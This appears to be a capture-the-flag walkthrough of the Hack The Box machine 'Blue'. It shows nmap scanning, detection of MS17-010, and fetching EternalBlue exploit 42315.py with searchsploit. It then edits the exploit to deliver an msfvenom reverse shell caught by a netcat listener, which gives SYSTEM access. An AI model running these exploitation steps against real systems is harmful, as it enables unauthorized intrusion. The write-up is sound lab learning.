<p align="center">
  <img src="https://github.com/Warrior9912/Hack-the-Box-Walkthroughs/assets/34217036/86ee30d6-5fc7-4c3f-8844-d35480574798">
</p>

<h1 align="center">Blue</h1>

<h2>Intro</h2>

<p>In this walkthrough we are going to talk about the machine <strong>Blue</strong>, it's an easy machine. We are going to me exploiting MS17-010, or Eternal Blue.
EternalBlue is a cyberattack exploit developed by the NSA that targets a vulnerability in Microsoft's SMB protocol. Its purpose is to gain unauthorized access to Windows computers. It had a significant impact, being used in major cyberattacks like WannaCry and NotPetya, causing widespread disruption and damage globally.
You can get more info about it here:
</p>

<a href="[https://github.com/blog/eternalblue-nsa-developed-exploit-just-wont-die](https://www.sentinelone.com/blog/eternalblue-nsa-developed-exploit-just-wont-die/)" style="text-align: center; display: block;">
  EternalBlue Exploit: What It Is And How It Works
</a>


<h2>Walkthrough</h2>

<h3>Recon and ennumeration</h3>

<p>As always we start by doing a fast TCP SYN scan with nmap</p>

<pre>nmap -p- -v -sS -Pn -f -n --min-rate 5000 --open 10.10.10.40 -oG allPorts</pre>

<ul>
  <li><strong>-p-</strong>: we are specifying that we want as many ports as possible to be scanned<li>
  <li><strong>-v</strong>: gives me a more detailed output during the scan</li>
  <li><strong>-sS</strong>: here we specify that we are doing a TCP SYN scan, it's faster than a full TCP scan, at the moment we just want to check the ports</li>
  <li><strong>-Pn</strong>: this flag is set to disable host discovery. It is used when the target does not respond to pings</li>
  <li><strong>-n</strong>: disables DNS resolution, this flag gives us more speed in the scan by avoiding resolving hostname, we will check that later</li>
  <li><strong>--min-rate 5000</strong>: with this flag, we are setting the minimum packet sending rate to 5000 packets per second, it makes the scan faster</li>
  <li><strong>--open</strong>: here we are specifying that we only want to show in the scan result the ports that are open</li>
  <li><strong>-oG allPorts</strong>: I am saving the scan result in a grepeable file called allPorts</li>
</ul>

<p align="center">
  <img src="https://github.com/Warrior9912/Hack-the-Box-Walkthroughs/assets/34217036/7924a960-3d1d-4f37-bfb5-1b8408b72992">
</p>

<p>We can see that port 445, we are going to do a more thorough scan of the ports to see if we find anything else but, at this point we should directly throw the script that shows if it is vulnerable to MS17-010. Whenever we look at port 445 and see that the system is a Windows XP to Windows Server 2016 system we should check if it is vulnerable to EternalBlue.</p>

<pre>nmap -p135,139,445 -v -Pn -n --min-rate 5000 --open -sCV 10.10.10.40 -oN targeted</pre>

<ul>
  <li><strong>-sC</strong>: It runs default scripts to get more info about our target. Uses common scripts for common vulns</li>
  <li><strong>-sV</strong>: this flag will return the version of the service that is on the open port</li>
  <li><strong>-oN targeted</strong>: this flag outputs the scan on a file named targeted. has a more comprehensible result</li>
</ul>

<p>
  <img src="https://github.com/Warrior9912/Hack-the-Box-Walkthroughs/assets/34217036/1d76b40b-5bb6-4735-9674-b4c0cdc92a40">
</p>

<pre>nmap -p445 --script smb-vuln-ms17-010 10.10.10.40</pre>

<ul>
  <li><strong>--script</strong>:  is used to specify Nmap scripts</li>
</ul>

<p align="center">
  <img src="https://github.com/Warrior9912/Hack-the-Box-Walkthroughs/assets/34217036/d1838ef7-7f55-4a1a-8297-af5ceca9dda2">
</p>

<p>Yep, it's vulnerable to MS17-010!</p>

<h2>Getting inside</h2>

<p>Here we already know that it's vulnerable to EternalBlue, so let's use <strong>searchsploit</strong> to check if Kali has something to deal with it (Kali obviously has tools for it 😄)</p>

<pre>searchsploit ms17-010</pre>

<p align="center">
  <img src="https://github.com/Warrior9912/Hack-the-Box-Walkthroughs/assets/34217036/b54562df-0d78-47e9-a4d5-50bbb31d6bc1">
</p>

<p>We can see a few scripts, the one that has helped me is the script 42315.py. So in the directory we are working in, we do the following to bring us the script</p>

<pre>searchsploit -m windows/remote/42315.py</pre>

<ul>
  <li><strong>-m</strong>: this flag will tell searchsploit to move/copy the script to the current directory</li>
</ul>

<p><strong>IMPORTANT:</strong> I've got some problems with this script becouse it's quite old and it's using Python 2.7, here it is what I've done to make it work:</p>

<ol>
  <li>
    <p>sudo apt update</p>
    <p>sudo apt install build-essential libssl-dev libffi-dev python2 python2-dev</p>
  </li>
  <li>
    <p>curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py</p>
    <p>sudo python2.7 get-pip.py</p>
  </li>
  <li>
    <p>git clone https://github.com/SecureAuthCorp/impacket.git</p>
    <p>cd impacket</p>
  </li>
  <li>git checkout impacket_0_9_22</li>
  <li>sudo pip2 install -r requirements.txt</li>
  <li>sudo python2.7 setup.py install</li>
  <li>pip install pyasn1 pycryptodomex</li>
</ol>

<p>You can also try to clone mysmb.py instead of the whole impacket git, but this is how it worked for me</p>

<p><strong>ALSO IMPORTANT:</strong> I was also looking at the script code and, you have to add or uncomment the two lines below the lines I have added in the smb_pwn() function, this function is just uploading a .txt right now, what we are looking for is to return a reverse shell, so let's prepare it with msfvenom</p>

<p aling="center">
  <img src="https://github.com/Warrior9912/Hack-the-Box-Walkthroughs/assets/34217036/ad2d380a-7c08-4554-86f5-b6e3013e921b">
</p>

<p aling="center">
  <img src="https://github.com/Warrior9912/Hack-the-Box-Walkthroughs/assets/34217036/392d1791-9b40-4a56-b08d-924d72eb7bee">
</p>

<p aling="center">
  <img src="https://github.com/Warrior9912/Hack-the-Box-Walkthroughs/assets/34217036/946a71e5-1003-46ca-ab63-e58ee6708104">
</p>

<p>And now if we prepare a listener with <strong>Netcat</strong> and execute the python script we are in! Also we are authority\system already! 😄</p>

<pre>nc -lnvp 1234</pre>

<pre>python2 42315.py 10.10.10.40</pre>

<p align="center">
  <img src="https://github.com/Warrior9912/Hack-the-Box-Walkthroughs/assets/34217036/c62aaea8-fd4b-41b1-a515-292594b428bc">
</p>

<p>So we can get both flags!</p>

<p align="center">
  <img src="https://github.com/Warrior9912/Hack-the-Box-Walkthroughs/assets/34217036/de58a251-53c5-4a43-83b4-fca57711af26">
</p>

<p>This machine has been interesting to make, I have learned something more about EternalBlue. Be nice!</p>
